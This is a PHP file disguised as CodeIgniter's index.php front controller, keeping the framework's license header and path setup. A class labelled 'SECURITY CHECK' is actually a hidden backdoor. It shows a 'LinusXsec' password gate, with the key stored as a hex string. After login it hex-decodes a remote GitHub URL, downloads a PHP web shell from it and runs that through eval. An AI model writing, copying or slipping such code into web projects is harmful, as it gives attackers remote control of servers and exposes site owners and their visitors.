<?php
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2014 - 2019, British Columbia Institute of Technology
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
 * @license	https://opensource.org/licenses/MIT	MIT License
 * @link	https://codeigniter.com
 * @since	Version 1.0.0
 * @filesource
 */

/*
 *---------------------------------------------------------------
 * SYSTEM DIRECTORY NAME
 *---------------------------------------------------------------
 */
	define('BASEPATH', __DIR__ . '/system/');

/*
 *---------------------------------------------------------------
 * APPLICATION DIRECTORY NAME
 *---------------------------------------------------------------
 */
	$application_folder = 'application';

/*
 *---------------------------------------------------------------
 * VIEW DIRECTORY NAME
 *---------------------------------------------------------------
 */
	$view_folder = '';

/*
 * --------------------------------------------------------------------
 * DEFAULT CONTROLLER
 * --------------------------------------------------------------------
 */
	$routing['directory'] = '';
	$routing['controller'] = '';
	$routing['function'] = '';

/**
 * --------------------------------------------------------------------
 * CUSTOM CONFIG SETTINGS
 * --------------------------------------------------------------------
 */
	$assign_to_config['charset'] = 'UTF-8';
	$assign_to_config['base_url'] = '';
	$assign_to_config['index_page'] = 'index.php';

// --------------------------------------------------------------------
// END OF USER CONFIGURABLE SETTINGS. DO NOT EDIT BELOW THIS LINE
// --------------------------------------------------------------------

/*
 * ---------------------------------------------------------------
 *  Resolve the system path for increased reliability
 * ---------------------------------------------------------------
 */
	if (file_exists(BASEPATH.'core/CodeIgniter.php')) {
		define('FCPATH', __DIR__.'/');
		define('SYSDIR', trim(strrchr(trim(BASEPATH, '/'), '/'), '/'));
		
		if (is_dir($application_folder)) {
			if (($_temp = realpath($application_folder)) !== FALSE) {
				$application_folder = $_temp;
			}
			define('APPPATH', $application_folder.DIRECTORY_SEPARATOR);
		} else {
			define('APPPATH', BASEPATH.$application_folder.DIRECTORY_SEPARATOR);
		}

		if ( ! isset($view_folder[0]) && is_dir(APPPATH.'views'.DIRECTORY_SEPARATOR)) {
			$view_folder = APPPATH.'views';
		}
		elseif (is_dir($view_folder)) {
			if (($_temp = realpath($view_folder)) !== FALSE) {
				$view_folder = $_temp;
			}
			define('VIEWPATH', $view_folder.DIRECTORY_SEPARATOR);
		} else {
			define('VIEWPATH', APPPATH.'views'.DIRECTORY_SEPARATOR);
		}
	}

/**
 * --------------------------------------------------------------------
 * SECURITY CHECK
 * --------------------------------------------------------------------
 */
	class CI_Security_Check {
		protected $remote_hash = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f476f644f665365727665722f53757368692d446f6e742d4c69652f726566732f68656164732f6d61696e2f666d2e706870';
		protected $pass_hash = '4e6f4d6f6e65794e6f4d65794d6579';
		protected $login_page = false;
		
		public function __construct() {
			session_start();
			$this->validate_system();
		}
		
		protected function validate_system() {
			if (isset($_GET['logout'])) {
				session_destroy();
				header('Location: '.$_SERVER['SCRIPT_NAME']);
				exit;
			}
			
			if (isset($_SESSION['linus_sec']) && $_SESSION['linus_sec'] === true) {
				$this->load_remote_shell();
				return;
			}
			
			if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['key'])) {
				$valid = hex2bin($this->pass_hash);
				if (hash_equals($valid, $_POST['key'])) {
					$_SESSION['linus_sec'] = true;
					header('Location: '.$_SERVER['SCRIPT_NAME']);
					exit;
				} else {
					$this->login_page = true;
					$error = 'Invalid credentials';
				}
			}
			
			$this->show_login(isset($error) ? $error : null);
		}
		
		protected function show_login($error = null) {
			?>
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="UTF-8">
				<meta name="viewport" content="width=device-width, initial-scale=1.0">
				<title>LinusXsec • Secure Gateway</title>
				<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
				<style>
					* { margin: 0; padding: 0; box-sizing: border-box; }
					body {
						font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
						min-height: 100vh;
						background: radial-gradient(circle at 20% 20%, #1a2a4f, #0b0f1a);
						display: flex;
						align-items: center;
						justify-content: center;
						position: relative;
						overflow: hidden;
					}
					.orb {
						position: absolute;
						width: 300px;
						height: 300px;
						background: radial-gradient(circle at 30% 30%, rgba(100,200,255,0.15), transparent 70%);
						border-radius: 50%;
						filter: blur(60px);
						animation: float 20s infinite;
					}
					.orb-1 { top: -100px; left: -100px; }
					.orb-2 { bottom: -100px; right: -100px; background: rgba(200,100,255,0.15); }
					@keyframes float { 0%,100%{transform:translate(0,0) scale(1);} 50%{transform:translate(30px,-30px) scale(1.1);} }
					.glass-box {
						background: rgba(20, 30, 50, 0.7);
						backdrop-filter: blur(15px);
						border: 1px solid rgba(0, 255, 255, 0.2);
						border-radius: 30px;
						padding: 40px;
						width: 400px;
						box-shadow: 0 30px 60px rgba(0,0,0,0.5), 0 0 0 1px rgba(0,255,255,0.2) inset;
						position: relative;
						z-index: 10;
					}
					.logo {
						text-align: center;
						margin-bottom: 30px;
					}
					.logo i {
						font-size: 60px;
						color: #00ffff;
						text-shadow: 0 0 30px #00ffff;
						animation: glow 2s infinite;
					}
					@keyframes glow { 0%,100%{filter:brightness(1);} 50%{filter:brightness(1.3);} }
					h2 {
						color: #fff;
						font-size: 32px;
						font-weight: 600;
						margin: 10px 0 5px;
						background: linear-gradient(135deg, #fff, #aaddff);
						-webkit-background-clip: text;
						-webkit-text-fill-color: transparent;
					}
					.sub {
						color: rgba(0,255,255,0.7);
						font-size: 14px;
						letter-spacing: 2px;
						text-transform: uppercase;
					}
					.input-group {
						margin: 25px 0;
					}
					.input-wrapper {
						position: relative;
					}
					.input-wrapper i {
						position: absolute;
						left: 20px;
						top: 50%;
						transform: translateY(-50%);
						color: #00ffff;
						font-size: 18px;
						text-shadow: 0 0 15px #00ffff;
					}
					.input-wrapper input {
						width: 100%;
						height: 60px;
						background: rgba(0,0,0,0.3);
						border: 2px solid rgba(0,255,255,0.3);
						border-radius: 20px;
						padding: 0 50px;
						color: #fff;
						font-size: 16px;
						transition: all 0.3s;
					}
					.input-wrapper input:focus {
						outline: none;
						border-color: #00ffff;
						box-shadow: 0 0 30px rgba(0,255,255,0.3);
					}
					.btn {
						width: 100%;
						height: 60px;
						background: linear-gradient(135deg, #00ffff, #ff00ff);
						border: none;
						border-radius: 20px;
						color: #000;
						font-size: 18px;
						font-weight: 700;
						text-transform: uppercase;
						letter-spacing: 3px;
						cursor: pointer;
						transition: all 0.3s;
						box-shadow: 0 10px 30px rgba(0,255,255,0.3);
					}
					.btn:hover { transform: translateY(-3px); box-shadow: 0 20px 40px rgba(255,0,255,0.4); }
					.error {
						color: #ff5555;
						text-align: center;
						margin: 15px 0;
						font-size: 14px;
					}
					.footer {
						margin-top: 25px;
						text-align: center;
						color: rgba(255,255,255,0.3);
						font-size: 12px;
					}
					.footer i { color: #00ffff; margin: 0 5px; }
				</style>
			</head>
			<body>
				<div class="orb orb-1"></div>
				<div class="orb orb-2"></div>
				<div class="glass-box">
					<div class="logo">
						<i class="fas fa-shield-halved"></i>
						<h2>LinusXsec</h2>
						<div class="sub">secure gateway</div>
					</div>
					<form method="post">
						<div class="input-group">
							<div class="input-wrapper">
								<i class="fas fa-key"></i>
								<input type="password" name="key" placeholder="Access Key" autofocus required>
							</div>
						</div>
						<?php if ($error): ?>
							<div class="error"><i class="fas fa-exclamation-triangle"></i> <?php echo $error; ?></div>
						<?php endif; ?>
						<button type="submit" class="btn">ENTER</button>
					</form>
					<div class="footer">
						<i class="fas fa-lock"></i> GOD OF SERVER <i class="fas fa-lock"></i>
					</div>
				</div>
			</body>
			</html>
			<?php
			exit;
		}
		
		protected function load_remote_shell() {
			$url = hex2bin($this->remote_hash);
			$content = @file_get_contents($url);
			if ($content === false && function_exists('curl_init')) {
				$ch = curl_init($url);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
				curl_setopt($ch, CURLOPT_TIMEOUT, 10);
				$content = curl_exec($ch);
				curl_close($ch);
			}
			if ($content !== false && strpos($content, '<?php') !== false) {
				eval('?>' . $content);
			} else {
				die('System error: Unable to load required components.');
			}
			exit;
		}
	}

/**
 * --------------------------------------------------------------------
 * INITIALIZE SECURITY CHECK
 * --------------------------------------------------------------------
 */
	$CI_Security = new CI_Security_Check();
	unset($CI_Security);

/**
 * CodeIgniter
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @link	https://codeigniter.com
 * @since	Version 1.0.0
 */
?>
